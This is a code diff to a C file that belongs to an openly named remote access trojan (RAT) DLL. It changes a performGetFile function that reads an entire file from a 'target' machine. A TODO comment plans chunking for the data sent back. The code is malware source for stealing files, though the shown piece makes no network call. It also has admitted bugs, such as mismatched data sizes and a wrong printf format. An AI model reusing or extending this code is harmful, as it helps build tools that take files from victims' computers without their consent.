@@ -5,15 +5,20 @@
 #include "RAT-Dll-GetFile.h"
 #include "RAT-Dll-Connect.h"
 
+/*TODO: Add ability to start at offset within file
+		Add ability to chunk data we send back
+		Add ability */
+
 
 /** This function will perform a simple get file for us 
 params:
 * filePath - path to the file we're getting
 * fileBytes - buffer containing file bytes we got from our target file 
+* bufferSize - size of the output file buffer 
 return:
 * if successful we return SUCCESS; otherwise print error code and handle appropiately 
 */
-INT performGetFile(__in const char* filePath, __out char* fileBytes)
+INT performGetFile(__in const char* filePath, __out char* fileBytes, __out DWORD* bufferSize)
 {
 	INT status = SUCCESS;
 	HANDLE hFile;
@@ -47,6 +52,13 @@ INT performGetFile(__in const char* filePath, __out char* fileBytes)
 		goto cleanup;
 	}
 
+	// These data sizes dont match up so fix this later...
+	*bufferSize = fileSize.QuadPart;
+
+	printf("file size quad part %i", fileSize.QuadPart);
+
+
+
 	// Now note the size and read the file 
 	if (!ReadFile(hFile, fileBytes, fileSize.QuadPart, &dwBytesRead, NULL))
 	{
@@ -64,6 +76,8 @@ INT performGetFile(__in const char* filePath, __out char* fileBytes)
 		status = GetLastError();
 		goto cleanup;
 	}
+
+	OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Successfully got file from target! \n");
 
 cleanup:
 	return status;
